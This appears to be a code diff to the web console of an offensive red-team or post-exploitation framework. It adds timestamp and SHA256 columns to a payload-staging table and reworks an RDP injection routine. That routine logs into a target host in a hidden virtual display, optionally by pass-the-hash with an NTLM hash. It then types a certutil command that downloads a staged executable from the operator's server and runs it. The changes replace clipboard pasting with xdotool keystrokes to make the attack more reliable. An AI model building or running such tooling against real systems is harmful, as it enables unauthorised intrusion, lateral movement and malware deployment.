@@ -1771,11 +1771,11 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                 <tr>
                   <th style="width:30px;text-align:center"><input type="checkbox" id="stager-chk-all" onclick="stagerToggleAll(this)" title="Seleccionar todos"></th>
                   <th>Filename</th><th>Size</th><th>Type</th>
-                  <th>Downloads</th><th>One-shot</th><th>Full URL</th><th></th>
+                  <th>Downloads</th><th>One-shot</th><th>Created</th><th>SHA256</th><th>Full URL</th><th></th>
                 </tr>
               </thead>
               <tbody id="stager-files-tbody">
-                <tr><td colspan="8" style="text-align:center;color:var(--text3);padding:20px">No files staged</td></tr>
+                <tr><td colspan="10" style="text-align:center;color:var(--text3);padding:20px">No files staged</td></tr>
               </tbody>
             </table>
           </div>
@@ -1819,7 +1819,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div class="ipc-field"><label>NTLM Hash</label><input id="ipc-hash" placeholder=":aad3b435..." oninput="ipcUpdate()"></div>
               <div class="ipc-field"><label>Payload</label><select id="ipc-lbin" style="font-size:11px" onchange="ipcUpdate()"><option value="">— select —</option></select></div>
               <div class="ipc-field"><label>Remote path</label><input id="ipc-rpath" placeholder="C:\Windows\Temp\svc.exe" oninput="ipcUpdate()"></div>
-              <div class="ipc-field"><label>Staging URL</label><div style="display:flex;gap:4px"><input id="ipc-surl" placeholder="http://10.x.x.x:8080/s/<token>" oninput="ipcUpdate()" style="font-family:var(--mono);font-size:11px;flex:1;min-width:0"><select id="ipc-surl-pick" title="Staged files activos" style="font-size:11px;max-width:26px;padding:0 2px;cursor:pointer" onchange="if(this.value){document.getElementById('ipc-surl').value=this.value;const _fn=this.value.split('/').pop().split('?')[0];if(_fn&&/\.(exe|bin|dll|elf)$/i.test(_fn)){const _rp=document.getElementById('ipc-rpath');if(!_rp.value||/\\(svc|agent[^\\]*)\.exe$/i.test(_rp.value))_rp.value='C:\\\\Windows\\\\Temp\\\\'+_fn;}ipcUpdate();}this.selectedIndex=0"><option value="">▾</option></select></div></div>
+              <div class="ipc-field"><label>Staging URL</label><div style="display:flex;gap:4px"><input id="ipc-surl" placeholder="http://10.x.x.x:8080/s/<token>" oninput="ipcUpdate()" style="font-family:var(--mono);font-size:11px;flex:1;min-width:0"><select id="ipc-surl-pick" title="Staged files activos" style="font-size:11px;max-width:26px;padding:0 2px;cursor:pointer" onchange="if(this.value){document.getElementById('ipc-surl').value=this.value;const _fn=this.value.split('/').pop().split('?')[0];if(_fn&&/\.(exe|bin|dll|elf)$/i.test(_fn)){const _rp=document.getElementById('ipc-rpath');if(!_rp.value||/\\(svc|agent[^\\]*)\.exe$/i.test(_rp.value))_rp.value='C:\\Windows\\Temp\\'+_fn;}ipcUpdate();}this.selectedIndex=0"><option value="">▾</option></select></div></div>
               <div class="ipc-field"><label>IP Kali (SMB server)</label><input id="ipc-kaliip" placeholder="10.10.10.1" oninput="ipcUpdate()"></div>
             </div>
             <!-- Tabbed right panel -->
@@ -14070,7 +14070,7 @@ function renderStagerFiles(files) {
   }
 
   if (!files || files.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--text3);padding:20px">No files staged</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;color:var(--text3);padding:20px">No files staged</td></tr>';
     return;
   }
   const pubBase = stagerState.public_url || '';
@@ -14087,6 +14087,11 @@ function renderStagerFiles(files) {
       : '<span style="color:var(--text3);font-size:10px">set URL first</span>';
     const safeURL  = (fileURL||'').replace(/\\/g,'\\\\').replace(/'/g,"\\'");
     const safeName = f.name.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+    const ts = f.added_at ? new Date(f.added_at).toLocaleString() : '—';
+    const sha = f.sha256 || '';
+    const shaCell = sha
+      ? `<span class="mono" style="font-size:9px;color:var(--text3);cursor:pointer" title="${esc(sha)}" onclick="copyText('${esc(sha)}')">${sha.slice(0,8)}…</span>`
+      : '<span style="color:var(--text3)">—</span>';
     return `<tr>
       <td style="text-align:center"><input type="checkbox" class="stager-file-cb" value="${esc(f.token||'')}" onclick="event.stopPropagation();stagerUpdateSelCount()"></td>
       <td class="mono">${esc(f.name)}</td>
@@ -14094,6 +14099,8 @@ function renderStagerFiles(files) {
       <td style="color:var(--text3);font-size:10px">${esc(f.mime||'')}</td>
       <td class="mono" style="text-align:center">${f.downloads||0}</td>
       <td style="text-align:center">${f.one_shot ? '✓' : '—'}</td>
+      <td style="font-size:10px;color:var(--text3);white-space:nowrap">${esc(ts)}</td>
+      <td>${shaCell}</td>
       <td style="max-width:260px;overflow:hidden">${urlCell}</td>
       <td onclick="event.stopPropagation()">
         ${fileURL ? `<button class="btn btn-ghost btn-sm" onclick="renderCradles('${safeURL}','${safeName}')">📋 Cradles</button>` : ''}
@@ -17187,9 +17194,10 @@ async function ipcRun(action) {
       // so the RDP window never appears on the operator's real screen.
       // xclip writes to the virtual display clipboard; xdotool targets the same display.
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
+      // winCmd is typed directly via xdotool — no clipboard sync dependency.
+      // Backslashes in rpath become \\ in the bash double-quoted arg, which bash
+      // normalises back to \ before xdotool receives the string.
       const winCmd   = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
-      // Base64-encode clipboard content so it is quoting-safe inside any shell wrapper
-      const winCmdB64 = btoa(winCmd);
       // Use double-quoted xfreerdp args — safe inside bash -c '...' (only single quotes break it)
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
@@ -17197,31 +17205,30 @@ async function ipcRun(action) {
       const rdpDomDQ   = dDQ ? ` /d:"${dDQ}"` : '';
       const rdpCredsDQ = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:"${pDQ}"`;
       const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:800 /h:600 /log-level:OFF`;
-      // Wrapped in bash -c '...' — content must contain no literal single quotes
+      // Wrapped in bash -c '...' — content must contain no literal single quotes.
+      // xdotool type sends key events directly through xfreerdp → avoids the async
+      // RDP clipboard-sync race that caused xclip+ctrl+v to paste stale content.
       const steps = [
         `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
+        `command -v xdotool >/dev/null 2>&1 || apt-get install -y xdotool -qq`,
         `VDISP=:$(( $$ % 400 + 200 ))`,
         `Xvfb "$VDISP" -screen 0 1024x768x24 & XVFB_PID=$!`,
         `sleep 2`,
         `DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & XPID=$!`,
-        `sleep 10`,
+        `sleep 12`,
         `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | head -1)`,
         `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
         `echo "[*] RDP window=$WID pid=$XPID vdisp=$VDISP"`,
-        `printf %s "${winCmdB64}" | base64 -d | DISPLAY="$VDISP" xclip -selection clipboard`,
-        `sleep 1`,
         `DISPLAY="$VDISP" xdotool windowfocus --sync "$WID"`,
-        `sleep 0.3`,
+        `sleep 0.5`,
         `DISPLAY="$VDISP" xdotool key --window "$WID" Escape`,
         `sleep 0.5`,
         `DISPLAY="$VDISP" xdotool key --window "$WID" super+r`,
         `sleep 2`,
-        `DISPLAY="$VDISP" xdotool key --window "$WID" ctrl+a`,
-        `sleep 0.3`,
-        `DISPLAY="$VDISP" xdotool key --window "$WID" ctrl+v`,
+        `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 20 --window "$WID" "${winCmd}"`,
         `sleep 0.5`,
         `DISPLAY="$VDISP" xdotool key --window "$WID" Return`,
-        `sleep 10`,
+        `sleep 12`,
         `kill $XPID 2>/dev/null`,
         `kill $XVFB_PID 2>/dev/null`,
         `echo "[+] rdp-inject done"`,
